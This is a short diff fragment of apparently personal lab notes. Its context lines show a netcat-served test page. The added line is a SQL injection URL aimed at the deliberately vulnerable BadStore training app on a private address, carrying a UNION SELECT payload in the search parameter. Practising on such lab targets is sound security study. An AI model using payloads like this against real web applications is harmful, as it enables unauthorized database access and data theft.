@@ -46,3 +46,5 @@ Server: nooblinux
 <title>Nooblinux</title> 
 <h1>Hello from Netcat!</h1>
  for shell scrpit 
+===========================
+http://192.168.5.165/cgi-bin/badstore.cgi?searchquery=x%27+union+select+count(itemnum),count(itemnum),count(itemnum),count(itemnum)+price+from+itemdb+--+&action=search&x=11&y=9
